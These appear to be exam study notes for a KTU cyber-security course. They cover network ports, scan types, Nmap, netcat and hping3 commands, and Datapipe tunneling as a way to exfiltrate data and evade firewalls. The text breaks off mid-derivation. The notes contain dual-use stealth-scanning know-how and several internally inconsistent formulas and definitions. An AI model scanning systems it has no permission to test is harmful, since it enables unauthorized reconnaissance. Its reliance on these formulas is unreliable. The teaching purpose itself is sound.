A **Network Service** refers to a software application, daemon, or process that listens on a specific port to provide functionality to remote clients over a network. The combination of an **IP Address (logical host identifier)** + **Port Number (process identifier)** + **Transport Protocol (TCP/UDP)** uniquely identifies a network communication session, formally known as a **Socket** or **Network Socket**.

> [!IMPORTANT]
> **KTU 2024 Highlight:** A socket is defined as the **4-tuple** {Source IP, Source Port, Destination IP, Destination Port}. This is the foundational unit of any TCP/UDP communication and is critical for firewall rule design.

### 1.2 Conceptual Analogy / Intuition

Imagine a large corporate office building (the **Server/Host**) with a single street address (the **IP Address**). The building has **65,536 numbered doors** (the **Ports**). Each door is dedicated to a specific department or service:

- **Door 80** → Reception desk (HTTP web traffic)
- **Door 443** → Secure executive lounge (HTTPS encrypted traffic)
- **Door 22** → IT/System Administrator office (SSH remote login)
- **Door 25** → Mailroom (SMTP email)

When a client (visitor) wishes to meet a specific department, they travel to the building's address and knock on the corresponding door number. A **Port Scanner** is like a security guard who walks around the building and tests each door to see if anyone answers, identifying which departments are open to the public and which are closed. **Service Detection Tools** go a step further by asking the responding department, "What do you do?" to identify the specific software (e.g., Apache vs. Nginx) and its version.

> [!NOTE]
> **Why 65,536 Ports?**
> The number of ports is mathematically derived from the 16-bit port field in the TCP/UDP header. With 16 bits, the maximum unique values are $2^{16} = 65,536$ (numbered 0 through 65,535). This is a **hard physical constant** of the IPv4 protocol specification (RFC 793 / RFC 768).

### 1.3 Standard Port Number Categories (IANA Registry)

The **Internet Assigned Numbers Authority (IANA)** maintains the official registry of port assignments, dividing the port space into three primary ranges:

| Range | Category | Allocation Authority |
|---|---|---|
| **0 – 1023** | Well-Known Ports | Requires root/admin privileges to bind |
| **1024 – 49151** | Registered Ports | Assigned by IANA upon application |
| **49152 – 65535** | Dynamic / Private / Ephemeral Ports | Used by clients for outgoing connections |

> [!IMPORTANT]
> Port **0** is technically reserved and should not be used in production traffic. In socket programming, binding to port "0" tells the OS to assign any available ephemeral port dynamically.

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 Operational Breakdown of Port-Based Communication

The lifecycle of a typical TCP port communication follows a structured sequence:

1. **Server-Side Binding (Listening):** The service daemon invokes the `bind()` system call, associating itself with a specific port number (e.g., Apache binds to TCP port 80). The OS marks this port as `LISTEN` state in its internal socket table.
2. **Client-Side Request:** The client selects a random ephemeral port (e.g., 49152) as its source port and sends a SYN packet to the destination IP + destination port 80.
3. **Three-Way Handshake (TCP only):** The kernel performs `SYN` → `SYN-ACK` → `ACK` to establish a reliable session.
4. **Data Exchange:** Application-layer protocols (HTTP, FTP, SSH) exchange structured payloads.
5. **Connection Teardown:** TCP Four-Way Handshake (`FIN` → `ACK` → `FIN` → `ACK`) gracefully closes the session.

> [!NOTE]
> **UDP services** (e.g., DNS on port 53) skip the handshake entirely, operating in a "fire-and-forget" connectionless mode. This is critical to remember during port scanning — UDP scanning is inherently slower and less reliable than TCP scanning.

### 2.2 KTU High-Yield Formula Sheet / Cheat Sheet

#### 2.2.1 Port Number Mathematical Boundaries

The total port space cardinality and the size of each IANA category can be expressed as:

$$
\begin{aligned}
N_{\text{total}} &= 2^{16} = 65{,}536 \text{ ports} \\[4pt]
N_{\text{well-known}} &= 1024 - 0 = 1024 \text{ ports} \\[4pt]
N_{\text{registered}} &= 49{,}152 - 1024 = 48{,}128 \text{ ports} \\[4pt]
N_{\text{ephemeral}} &= 65{,}535 - 49{,}152 + 1 = 16{,}384 \text{ ports}
\end{aligned}
$$

#### 2.2.2 Scan Time Estimation (Theoretical Lower Bound)

For a full TCP connect scan across all ports on a single host, the theoretical minimum time required (ignoring rate-limiting, latency, and retransmissions) is:

$$
T_{\text{min}} = N_{\text{ports}} \times (RTT_{\text{avg}} + T_{\text{processing}})
$$

Where:
- $N_{\text{ports}}$ = Number of ports being scanned
- $RTT_{\text{avg}}$ = Average round-trip time to target in seconds
- $T_{\text{processing}}$ = Tool overhead per probe (typically 0.1 ms to 5 ms)

> [!NOTE]
> **Engineering Reality Check:** A full 65,536-port TCP connect scan against a host with a 50 ms RTT takes at minimum $\approx 3{,}276$ seconds ($\approx 55$ minutes) in a naive implementation. Production-grade tools like **Nmap** use parallelization, half-open (SYN) scans, and adaptive timing to reduce this drastically.

#### 2.2.3 Socket Uniqueness Identity (KTU Exam Favorite)

A network session is uniquely identified by the 5-tuple:

$$
\text{Session} = \{ \text{Proto},\ \text{SrcIP},\ \text{SrcPort},\ \text{DstIP},\ \text{DstPort} \}
$$

> [!WARNING]
> **KTU Common Mistake:** Students frequently write "a socket is defined by IP + Port." This is **incomplete** and will cost marks. A socket (session) requires **both endpoints**. The correct answer is the 4-tuple (for identification of one direction) or 5-tuple (including protocol).

#### 2.2.4 KTU Cheat Sheet: Critical Well-Known Ports

| Port | Protocol | Transport | Service Description | Security Relevance |
|:---:|:---:|:---:|:---|:---|
| **20/21** | FTP | TCP | File Transfer Protocol (Control on 21, Data on 20) | Plaintext credentials — high risk |
| **22** | SSH | TCP | Secure Shell (encrypted remote login) | Brute-force target |
| **23** | Telnet | TCP | Unencrypted remote terminal | **Deprecated** — never use in production |
| **25** | SMTP | TCP | Simple Mail Transfer Protocol (mail sending) | Open relay abuse, spam |
| **53** | DNS | TCP/UDP | Domain Name System | DNS amplification, zone transfer |
| **67/68** | DHCP | UDP | Dynamic Host Configuration Protocol | Rogue DHCP server attacks |
| **80** | HTTP | TCP | Hypertext Transfer Protocol (web) | Unencrypted web traffic |
| **110** | POP3 | TCP | Post Office Protocol (mail retrieval) | Plaintext credentials |
| **143** | IMAP | TCP | Internet Message Access Protocol | Mail server attacks |
| **443** | HTTPS | TCP | HTTP over TLS/SSL (encrypted web) | TLS misconfiguration attacks |
| **445** | SMB | TCP | Server Message Block (Windows file sharing) | EternalBlue, WannaCry vector |
| **3306** | MySQL | TCP | MySQL database | SQL injection, weak passwords |
| **3389** | RDP | TCP | Remote Desktop Protocol | BlueKeep vulnerability, brute force |
| **5432** | PostgreSQL | TCP | PostgreSQL database | Database enumeration |
| **6379** | Redis | TCP | Redis in-memory database | Unauthenticated RCE if exposed |
| **8080** | HTTP-Alt | TCP | Common alternative web port | Often misconfigured admin panels |

> [!IMPORTANT]
> **KTU 2024 Hot Topic:** Ports **445 (SMB)** and **3389 (RDP)** are repeatedly tested in KTU exams due to their association with real-world malware (WannaCry, NotPetya) and ransomware attacks. Always remember their security implications.

### 2.3 Real-World Engineering Utility

Port and service identification is the **first reconnaissance step** in:

- **Penetration Testing** (pre-attack enumeration)
- **Vulnerability Assessment** (matching open ports to CVE databases)
- **Network Forensics** (incident response and log analysis)
- **Firewall Rule Design** (allow/deny policies based on port + protocol)
- **Compliance Auditing** (PCI-DSS, ISO 27001 require closed unnecessary ports)
- **DevOps Monitoring** (verifying service availability post-deployment)

---

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
## 3. Step-by-Step Derivations & Analytical Matrix

### 3.1 Derivation: Port Space Cardinality

Since the port number field in the TCP/UDP header is 16 bits wide, the number of unique identifiers is:

$$
\begin{aligned}
N_{\text{total}} &= 2^{b} \quad \text{where } b = 16 \text{ bits} \\
N_{\text{total}} &= 2^{16} \\
N_{\text{total}} &= 65{,}536 \text{ unique values}
\end{aligned}
$$

**Explanation of logic:** Since the range starts at 0 (not 1) and ends at $2^{16} - 1$, the count is $65{,}535 - 0 + 1 = 65{,}536$.

### 3.2 Derivation: Size of the Ephemeral Port Range

Modern Linux kernels (since `net.ipv4.ip_local_port_range`) typically assign ephemeral ports within the range 32,768–60,999 by default. The number of available ephemeral ports is:

$$
\begin{aligned}
N_{\text{ephemeral}} &= \text{Max} - \text{Min} + 1 \\
N_{\text{ephemeral}} &= 60{,}999 - 32{,}768 + 1 \\
N_{\text{ephemeral}} &= 28{,}232 \text{ ports}
\end{aligned}
$$

**Explanation of logic:** The `+1` is mandatory in inclusive counting (e.g., ports 80 to 80 is exactly 1 port, not 0). This is a common off-by-one error in KTU scripts.

### 3.3 Analytical Matrix: Port Scanning Techniques

The following table presents the most commonly assessed scanning techniques in KTU Module 4:

| Scan Type | Flag Sent | Response on Open | Response on Closed | Stealth Level | Requires Privileges |
|:---|:---:|:---:|:---:|:---:|:---:|
| **TCP Connect** | `SYN` then full handshake | Full 3-way handshake completes | `RST/ACK` | Low (logged) | No |
| **SYN Scan (Half-Open)** | `SYN` | `SYN/ACK` (no ACK sent back) | `RST/ACK` | Medium | Yes (raw socket) |
| **FIN Scan** | `FIN` | No response (stealth) | `RST/ACK` | High | Yes |
| **NULL Scan** | No flags set | No response (stealth) | `RST/ACK` | High | Yes |
| **Xmas Scan** | `FIN + PSH + URG` | No response (stealth) | `RST/ACK` | High | Yes |
| **UDP Scan** | UDP packet | Response (or ICMP unreachable) | `ICMP Port Unreachable` | Variable | Yes |
| **ACK Scan** | `ACK` | `RST` (used to map firewall rules) | `RST` or filtered | High (firewall mapping) | Yes |

> [!IMPORTANT]
> **KTU 2024 Expected Answer for "Explain Xmas Scan":** The "Xmas" name comes from the fact that the packet has the FIN, PSH, and URG flags all "lit up" like a Christmas tree. It is a stealth scan used to bypass stateless firewalls. Closed ports respond with RST, while open ports silently drop the packet per RFC 793.

### 3.4 Step-by-Step: TCP Three-Way Handshake (Foundational Knowledge)

This forms the basis of understanding why a SYN scan is "half-open":

$$
\begin{aligned}
\text{Step 1:} \quad & \text{Client} \xrightarrow{\text{SYN (seq=x)}} \text{Server} \\
\text{Step 2:} \quad & \text{Server} \xrightarrow{\text{SYN-ACK (seq=y, ack=x+1)}} \text{Client} \\
\text{Step 3:} \quad & \text{Client} \xrightarrow{\text{ACK (seq=x+1, ack=y+1)}} \text{Server} \\
\text{Result:} \quad & \text{Connection Established (ESTABLISHED state)}
\end{aligned}
$$

**Why this matters for cyber security:** A **SYN scan** completes only Step 1 and Step 2, then sends an `RST` instead of the final `ACK`. This is why it is called "half-open" — the connection is never fully established, so many older logging systems fail to record it.

### 3.5 Analytical Decision Flow: Is a Port "Open"?

When a port scanner probes a port, the result is classified into one of four states:

$$
\text{State} = \begin{cases}
\text{open} & \text{if } \text{SYN-ACK received} \\
\text{closed} & \text{if } \text{RST received} \\
\text{filtered} & \text{if } \text{no response (timeout) AND ICMP unreachable received} \\
\text{open}\vert\text{filtered} & \text{if } \text{no response (used for UDP, FIN, NULL, Xmas)}
\end{cases}
$$

> [!WARNING]
> **KTU Pitfall:** Do not confuse **"filtered"** with **"closed."** A closed port sends a definitive RST packet. A filtered port sends *nothing* (or an ICMP admin-prohibited message), indicating a firewall is dropping probes.

---

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
## 4. Structural Diagrams & Schematics

### 4.1 Port & Service Architecture Flow

```mermaid
flowchart TD
    A[Client Application] --> B[Transport Layer Selection]
    B --> C{TCP or UDP}
    C -->|TCP| D[Three-Way Handshake]
    C -->|UDP| E[Connectionless Send]
    D --> F[Source Port Assigned]
    E --> F
    F --> G[Packet Constructed with 4-Tuple]
    G --> H[Network Transmission to Destination IP]
    H --> I[Destination Host Receives Packet]
    I --> J{Destination Port Listening}
    J -->|Yes| K[Service Daemon Processes Request]
    J -->|No| L[RST Sent - Port Closed]
    I --> M{Firewall Present}
    M -->|Allow Rule| J
    M -->|Deny Rule| N[Packet Dropped - Port Filtered]
    K --> O[Response Sent to Client]
    O --> P[Service Enumeration Phase]
    P --> Q[Banner Grabbing]
    P --> R[Version Detection]
    P --> S[OS Fingerprinting]
```

### 4.2 Port Scanning Workflow (Methodology)

```mermaid
flowchart LR
    A[Step 1: Host Discovery] --> B[Step 2: Port Enumeration]
    B --> C[Step 3: Service Detection]
    C --> D[Step 4: Version Detection]
    D --> E[Step 5: OS Fingerprinting]
    E --> F[Step 6: Vulnerability Correlation]
    F --> G[Final Report: Open Ports + Services + CVEs]
```

### 4.3 Functional Block Diagram: Port and Service Tools

```mermaid
flowchart TB
    subgraph Toolset [Understanding Port and Service Tools]
        direction TB
        A1[Nmap] --> A2[Industry Standard Scanner]
        A3[Netcat] --> A4[Banner Grabbing and Pivoting]
        A5[Masscan] --> A6[High-Speed Internet Scale Scanning]
        A7[Wireshark] --> A8[Packet Level Analysis]
        A9[Hping3] --> A10[Custom Packet Crafting]
        A11[Zenmap] --> A12[GUI Frontend for Nmap]
    end
    Toolset --> Outcome[Reconnaissance and Security Assessment]
```

### 4.4 TCP State Transition Diagram (Simplified for Scanning Context)

```mermaid
stateDiagram-v2
    [*] --> Closed
    Closed --> SynSent: Client sends SYN
    SynSent --> Established: Server replies SYN-ACK
    SynSent --> SynSent: Retransmit on timeout
    Established --> Closed: Full Handshake Complete
    SynSent --> Closed: RST received - Connect Scan Detected
    SynSent --> SynReceived: SYN Scan Half Open State
    SynReceived --> Closed: Scanner sends RST to avoid completion
```

> [!NOTE]
> **Diagram Interpretation Note:** The state diagram above illustrates why a SYN scan is stealthier — the scanner resets the connection before reaching the `ESTABLISHED` state, minimizing the footprint in connection logs of many basic IDS/IPS systems.

---

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A: Short Answer Questions (3 Marks Each)

---

**Q1. [KTU University Exam – Dec 2023, Model Paper]**
*Define the term "Network Port." Explain the three IANA port number categories with their respective ranges.*

**Model Answer:**

A **Network Port** is a 16-bit logical identifier (0–65,535) used at the Transport Layer to multiplex multiple network services on a single host.

The three IANA categories are:

1. **Well-Known Ports (0–1023):** Reserved for system-level and widely used services (e.g., HTTP on 80, SSH on 22). Binding to these ports requires administrative/root privileges on Unix-like systems.
2. **Registered Ports (1024–49151):** Assigned by IANA to specific vendor applications upon request (e.g., MySQL on 3306, RDP on 3389).
3. **Dynamic/Private/Ephemeral Ports (49152–65535):** Used temporarily by client-side applications as source ports for outgoing connections. These are assigned automatically by the operating system kernel.

---

**Q2. [KTU University Exam – June 2024, Expected Pattern]**
*What is a "half-open scan"? Why is it preferred over a TCP connect scan in certain scenarios?*

**Model Answer:**

A **half-open scan** (also called a **SYN scan**) is a port scanning technique where the scanner sends a `SYN` packet and waits for a `SYN-ACK` response, but does **not** complete the three-way handshake. Instead, it immediately sends an `RST` (Reset) packet to tear down the half-established connection.

**Advantages over TCP connect scan:**
- **Stealth:** Many legacy logging systems and IDS tools only log fully established connections, so SYN scans leave a smaller audit trail.
- **Speed:** Skipping the final `ACK` reduces per-port overhead, enabling faster scans at scale.
- **Resource Efficiency:** Fewer kernel resources are consumed on the target since connections never reach the `ESTABLISHED` state.
- **Privilege Note:** A SYN scan requires raw socket access (root/admin on Unix) because it forges packets without completing the OS-managed handshake.

---

### 5.2 Part B: Long Answer Questions (14 Marks Each — Internal Choice)

---

**Q3. Question A [14 Marks] [KTU University Exam – Dec 2022 Pattern]**

**(a) [7 Marks]** Explain the TCP three-way handshake with a neat diagram. How is this handshake exploited in a SYN flood attack?

**(b) [7 Marks]** With a suitable diagram, explain the architecture of the Nmap port scanning tool. List any four scanning techniques supported by Nmap with their packet structures.

---

#### Model Solution:

**(a) TCP Three-Way Handshake (7 Marks)**

The TCP three-way handshake is the procedure used to establish a reliable connection between a client and a server before data transfer.

**Step-by-step flow:**

$$
\begin{aligned}
\text{1. } & \text{Client} \xrightarrow{\text{SYN, seq}=x} \text{Server} \quad \text{(Client requests synchronization)} \\
\text{2. } & \text{Server} \xrightarrow{\text{SYN-ACK, seq}=y, \text{ack}=x+1} \text{Client} \\
\text{3. } & \text{Client} \xrightarrow{\text{ACK, seq}=x+1, \text{ack}=y+1} \text{Server} \\
\text{Result:} & \text{Connection enters ESTABLISHED state on both sides}
\end{aligned}
$$

**Diagram:**

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: SYN (seq=100)
    S->>C: SYN-ACK (seq=300, ack=101)
    C->>S: ACK (seq=101, ack=301)
    Note over C,S: Connection ESTABLISHED
```

**SYN Flood Attack Exploitation (3 of the 7 marks):**

In a SYN flood, the attacker sends a massive volume of `SYN` packets with **spoofed source IP addresses** and never sends the final `ACK`. The victim server allocates memory for each half-open connection (in the `SYN_RECEIVED` state). Once the connection table (SYN backlog queue) is exhausted, the server cannot accept legitimate connections, resulting in a **Denial of Service (DoS)**.

**Mitigations:** SYN cookies, increasing backlog queue, using upstream DDoS scrubbing services, and rate-limiting.

---

**(b) Nmap Architecture and Scanning Techniques (7 Marks)**

**Nmap Architecture (5 marks):**

```mermaid
flowchart TB
    A[User Command Line / Zenmap GUI] --> B[Nmap Core Engine]
    B --> C[Host Discovery Module]
    B --> D[Port Scanning Engine]
    B --> E[Service Version Detection -sv]
    B --> F[OS Fingerprinting -O]
    B --> G[Scripting Engine NSE]
    B --> H[Output Formatter -oN -oX -oG]
    C --> I[Target Network]
    D --> I
    E --> I
    F --> I
    G --> I
    I --> J[Raw Response Capture]
    J --> K[Analysis and Correlation]
    K --> L[Final Report]
```

**Four Nmap Scanning Techniques (2 marks):**

1. **TCP SYN Scan (`-sS`):** Sends `SYN`; expects `SYN-ACK` for open ports. Sends `RST` to close. Requires root.
2. **TCP Connect Scan (`-sT`):** Completes full 3-way handshake using OS `connect()` syscall. No root required.
3. **UDP Scan (`-sU`):** Sends empty UDP packets; closed ports reply with ICMP Port Unreachable, open ports reply with service data. Slow but essential.
4. **FIN Scan (`-sF`):** Sends packets with only the `FIN` flag set. Per RFC 793, closed ports respond with `RST`; open ports silently drop the packet. Stealthy against stateless firewalls.

---

**Q3. Question B (Alternative Choice) [14 Marks] [KTU University Exam – June 2023 Pattern]**

**(a) [7 Marks]** What is a port scan? Discuss the different types of port scans with their packet flags. Differentiate between open, closed, and filtered port states.

**(b) [7 Marks]** Explain the working of the following tools: (i) Netcat, (ii) Hping3, (iii) Wireshark. How do these tools assist in service enumeration and banner grabbing?

---

#### Model Solution Outline:

**(a) Port Scan and Types (7 Marks):**

- **Definition:** A port scan is a reconnaissance technique to identify open ports and running services on a target host.
- **Types:** TCP Connect, SYN, FIN, NULL, Xmas, ACK, UDP, Window — each differentiated by the TCP flags set (table from Section 3.3 should be reproduced).
- **State differentiation:**
  - **Open:** Service is actively listening and accepting connections.
  - **Closed:** No service is listening, but the host responds with `RST` (reachable).
  - **Filtered:** A firewall or ACL is blocking probes; no response or ICMP admin-prohibited received.

**(b) Tools (7 Marks):**

- **Netcat (Swiss Army Knife):** Creates raw TCP/UDP connections, used for banner grabbing (`nc -v target 80`), port scanning (`nc -zv target 1-1000`), and file transfer.
- **Hping3:** Packet crafter used to send custom TCP/UDP/ICMP packets. Useful for firewall rule testing, idle scans, and traceroute alternatives (`hping3 -S -p 80 -c 1 target`).
- **Wireshark:** GUI-based packet analyzer (not a scanner). Captures live traffic to identify services, protocols in use, and potential unencrypted credentials in service banners.

**Service Enumeration & Banner Grabbing:**
Banner grabbing is the technique of connecting to an open port and reading the service identification string. Example: `nc -v 192.168.1.1 80` followed by `HEAD / HTTP/1.0` may reveal "Apache/2.4.41 (Ubuntu)" — this information is then correlated with CVE databases for vulnerability assessment.

---

> [!WARNING]
> **KTU Examiner's Valuation Warning — Common Pitfalls:**
> 1. **Do NOT write "port = door of a computer"** as your primary definition. KTU examiners expect the **16-bit identifier, multiplexing role, and Transport Layer context**.
> 2. **Avoid the term "hacker tool"** when describing Nmap/Netcat. Use the formal term **"network reconnaissance and security auditing tool."**
> 3. **Always specify TCP vs UDP** when listing a service. Writing just "DNS uses port 53" is incomplete — write "DNS uses **port 53/TCP** for zone transfers and **port 53/UDP** for standard queries."
> 4. **In scanning questions, never omit the flag bits.** Writing "SYN scan sends a SYN" is worth 1 mark; writing "SYN scan sends a packet with the **SYN flag set, no ACK, no RST**" is worth full marks.
> 5. **Do not confuse port knocking with port scanning.** Port knocking is an authentication mechanism (closed sequence unlocks a port), not a discovery technique.

---

### 5.3 Topic Recap & Important Things to Remember

- A **port** is a **16-bit logical endpoint** at the Transport Layer. The total addressable range is $2^{16} = 65{,}536$ ports (0–65,535).
- The three IANA categories are: **Well-Known (0–1023)**, **Registered (1024–49151)**, and **Ephemeral (49152–65535)**.
- A **socket/session** is uniquely identified by the 5-tuple: **{Protocol, Source IP, Source Port, Destination IP, Destination Port}**.
- The **TCP three-way handshake** is `SYN → SYN-ACK → ACK`. A **SYN scan** deliberately skips the final `ACK` by sending an `RST`, making it a "half-open" scan.
- **Xmas scan** lights up `FIN + PSH + URG` flags (the "Christmas tree"); **NULL scan** sets no flags; **FIN scan** sets only `FIN`.
- **UDP scanning** is slower and less reliable than TCP scanning because it relies on ICMP "Port Unreachable" responses, which are often rate-limited.
- **Port states:** `open` (SYN-ACK received), `closed` (RST received), `filtered` (no response + ICMP unreachable or timeout).
- **Critical security-sensitive ports to memorize:** 22 (SSH), 23 (Telnet — deprecated), 80 (HTTP), 443 (HTTPS), 445 (SMB — WannaCry), 3389 (RDP — BlueKeep), 3306 (MySQL), 53 (DNS).
- **Nmap** is the industry-standard tool. Key flags: `-sS` (SYN), `-sT` (Connect), `-sU` (UDP), `-O` (OS detect), `-sV` (version detect), `-A` (aggressive — combines -O, -sV, traceroute, scripts).
- **Netcat** is used for banner grabbing and manual service interaction; **Wireshark** is for passive packet capture, not active scanning.
- **SYN flood DoS** exploits the half-open connection queue by sending spoofed SYNs and never completing the handshake.
- **Banner grabbing** reveals service name and version, which is then mapped to known CVEs for vulnerability assessment.
- **Port knocking** ≠ port scanning; it is an authentication sequence to dynamically open a previously closed port.

<!-- SECTION_5_END -->

topics.title: Datapipe
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEEOT741 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 4
> - **Topic:** Datapipe

<!-- SECTION_1_START -->
# 📘 MODULE 4 — DATAPIPE: SECURE & COVERT DATA CHANNELING

## 1.1 Core Technical Definition

> [!NOTE]
> **Formal Definition (KTU 2024 Syllabus Terminology)**
> **Datapipe** is a networking utility (and the broader technique it represents) that establishes a **bidirectional, application-layer TCP data channel** between a *local endpoint* and a *remote endpoint* by transparently relaying raw bytes across a tunneled connection. In cyber security, Datapipe is studied as a **covert-channel construction tool** used both legitimately (for tunneling traffic across restricted networks) and maliciously (for **data exfiltration**, **Command-and-Control (C2) beaconing**, and **firewall evasion**).

In a more formal Information-Security context, Datapipe embodies the principle of **encapsulated data transport** where user data is treated as an opaque byte stream and forwarded through an intermediary relay without inspecting or modifying the payload semantics.

### 🧠 Intuitive Analogy (Real-World Analogy)

> [!IMPORTANT]
> **The "Secret Postal Pipe" Analogy**
> Imagine you want to send letters between two people (Alice and Bob), but a strict postal inspector (the firewall) at the post office checks every parcel. A **Datapipe** is like creating a **sealed opaque pipe** that the postal inspector cannot see through. Alice drops her letter into one end of the pipe at the local post office; the letter slides through the pipe (often going through a trusted third-party relay) and emerges at Bob's post office, completely invisible to the inspector. The inspector only sees "pipe activity" — not the letter inside.
>
> - **Alice** = Local client
> - **Bob** = Remote server
> - **The pipe** = TCP tunnel / Datapipe channel
> - **Postal inspector** = Intrusion Detection System / Firewall
> - **Trusted third-party relay** = Proxy / Pivot host

### 📌 Key Standard Metrics in Datapipe Operations

| Metric | Symbol | Typical Value / Unit |
|---|---|---|
| **Local listen port** | $L_{port}$ | **1024 – 65535** (ephemeral) |
| **Remote target port** | $R_{port}$ | **Service-dependent** (e.g., 443, 80) |
| **Channel bandwidth** | $B$ | **Measured in Mbps / Gbps** |
| **Round-Trip Time (RTT)** | $\tau$ | **Milliseconds (ms)** |
| **Encapsulation overhead** | $O_{encap}$ | **20 – 60 bytes per packet** |
| **MTU** | $M$ | **1500 bytes** (Ethernet default) |

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Operational Architecture of a Datapipe Channel

A Datapipe operates on the **Client–Relay–Server** triad. The relay is the *pivot* or *proxy* host that bridges the two otherwise-disconnected endpoints.

### 🔍 Step-by-Step Logical Decomposition

1. **Binding Phase** — The local Datapipe instance binds to a *local TCP port* ($L_{port}$) and waits for an internal client connection.
2. **Tunnel Establishment** — A persistent outbound connection is opened from the relay to the remote target port ($R_{port}$), typically camouflaged as **HTTPS (port 443)** or **DNS (port 53)** to bypass egress filtering.
3. **Byte Forwarding Loop** — A bidirectional byte-copy loop shuttles data:
   - **Client → Relay → Server** (uplink)
   - **Server → Relay → Client** (downlink)
4. **Encapsulation Layer** — Optional wrapping using **TLS/SSL** provides confidentiality; optional **obfuscation** (e.g., XOR, domain-fronting) hides the channel signature.
5. **Termination Phase** — Either endpoint closes the TCP session; the Datapipe process cleans up sockets and exits.

> [!TIP]
> **The "Why" behind the Design**
> Datapipe's elegance lies in **protocol-agnosticism**: it does not care whether the relayed bytes are HTTP, SSH, RDP, or a custom binary protocol. This makes it a *universal tunneling primitive* — and equally, a *universal exfiltration primitive* from a defender's perspective.

## 2.2 The Two Faces of Datapipe: Defensive vs. Offensive Use

| Perspective | Use Case | Example |
|---|---|---|
| 🛡️ **Defensive (Blue Team)** | Secure tunneling across untrusted networks | Remote sysadmin access from a coffee-shop Wi-Fi |
| 🛡️ **Defensive** | Bypassing geo-restrictions for legitimate research | Academic access to journal mirrors |
| ⚔️ **Offensive (Red Team)** | **Data exfiltration** from a compromised host | Tunneling stolen DB dumps out of a victim network |
| ⚔️ **Offensive** | **C2 (Command-and-Control) beaconing** | RAT communication disguised as HTTPS |
| ⚔️ **Offensive** | **Pivoting** through a compromised host | Using an internal host as a relay to reach the DMZ |

## 2.3 📐 KTU Formula Sheet / Cheat Sheet

> [!IMPORTANT]
> All formulas below are **board-examination critical**. Memorize the units and boundary conditions.

| # | Formula | Description | Units |
|---|---|---|---|
| 1 | $T_{total} = T_{handshake} + T_{data} + T_{teardown}$ | Total session time | seconds |
| 2 | $T_{handshake} \approx 1.5 \times RTT$ | TCP 3-way handshake latency | seconds |
| 3 | $B_{eff} = \dfrac{P \times 8}{RTT}$ | Effective bandwidth (bandwidth-delay product) | bps |
| 4 | $O_{total} = (H_{ip} + H_{tcp} + H_{encap}) \times N$ | Total overhead for N packets | bytes |
| 5 | $E_{thrpt} = \dfrac{D_{useful}}{D_{useful} + O_{total}}$ | Throughput efficiency (0 < E ≤ 1) | dimensionless |
| 6 | $\rho = \dfrac{V_{exfil}}{B_{link}}$ | Exfiltration saturation ratio (defender's metric) | 0 to 1 |
| 7 | $C_{detect} = k \cdot \sigma_{baseline}$ | Detection threshold (k·σ rule) | packets/sec |
| 8 | $L_{max} = M - H_{ip} - H_{tcp} - H_{encap}$ | Maximum payload per segment | bytes |

Where:
- $P$ = payload size (bytes)
- $N$ = number of packets
- $D_{useful}$ = useful data bytes
- $V_{exfil}$ = exfiltration data rate
- $B_{link}$ = link capacity
- $\sigma_{baseline}$ = standard deviation of normal traffic
- $H_{ip} = 20$ bytes, $H_{tcp} = 20$ bytes (minimum)

### 🌍 Real-World Engineering Utility

- **Penetration Testers** use Datapipe analogs (e.g., `socat`, `nc`, `chisel`, `ssh -L`) during authorized engagements.
- **Enterprise SOCs** must recognize Datapipe signatures to prevent **Advanced Persistent Threat (APT)** data theft.
- **Network Forensic Investigators** reconstruct Datapipe channels from PCAP files by spotting *long-lived, low-volume, encrypted outbound flows* to non-corporate IPs.
- **Cloud Architects** use Datapipe concepts to design **Zero-Trust Network Access (ZTNA)** solutions.

---

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# 3. Step-by-Step Derivations & Analytical Matrix

## 3.1 Derivation: Maximum Theoretical Throughput of a Datapipe Channel

We derive the **effective data rate** of a Datapipe channel given packet-level constraints.

### Step 1 — Define the Link Capacity
The physical link carries bits at a raw rate $R_{link}$ (in bps).

### Step 2 — Account for Protocol Overhead
For each packet, the *useful payload* is reduced by all header overheads:

$$L_{max} = M - H_{ip} - H_{tcp} - H_{encap}$$

### Step 3 — Compute the Overhead Fraction
Let $D_{useful}$ be the total user data and $N$ the number of packets. Then:

$$O_{total} = N \times (H_{ip} + H_{tcp} + H_{encap})$$

$$E_{thrpt} = \frac{D_{useful}}{D_{useful} + O_{total}}$$

### Step 4 — Apply the Bandwidth-Delay Product (BDP)
The BDP governs the *unacknowledged data in flight*:

$$B_{eff} = \frac{P \times 8}{RTT}$$

where $P$ is the maximum payload in bytes and the factor 8 converts bytes to bits.

### Step 5 — Effective Application-Layer Throughput
The actual useful throughput becomes:

$$R_{eff} = R_{link} \times E_{thrpt} \times (1 - P_{loss})$$

where $P_{loss}$ is the packet-loss probability (0 ≤ $P_{loss}$ < 1).

### Step 6 — Worked Numerical Example
> [!NOTE]
> **Given:** $R_{link} = 100$ Mbps, $M = 1500$ B, $H_{ip} = 20$ B, $H_{tcp} = 20$ B, $H_{encap} = 40$ B, $RTT = 50$ ms, $P_{loss} = 0.01$.

**Step 6a — Compute $L_{max}$:**

$$L_{max} = 1500 - 20 - 20 - 40 = 1420 \text{ bytes}$$

**Step 6b — Compute $E_{thrpt}$ (per packet):**

$$E_{thrpt} = \frac{1420}{1420 + 80} = \frac{1420}{1500} \approx 0.9467$$

**Step 6c — Compute $B_{eff}$:**

$$B_{eff} = \frac{1420 \times 8}{0.050} = \frac{11360}{0.050} = 227{,}200 \text{ bps} \approx 0.227 \text{ Mbps}$$

This is the BDP-limited throughput — far below the 100 Mbps link, because the high RTT throttles the unacknowledged window.

**Step 6d — Compute $R_{eff}$:**

$$R_{eff} = 100 \times 10^6 \times 0.9467 \times (1 - 0.01) \approx 93.72 \text{ Mbps}$$

## 3.2 Derivation: Defender's Exfiltration Detection Threshold

A SOC analyst wants to set an alert threshold. Using the **3-sigma rule** ($k = 3$):

$$C_{detect} = k \cdot \sigma_{baseline} = 3 \cdot \sigma_{baseline}$$

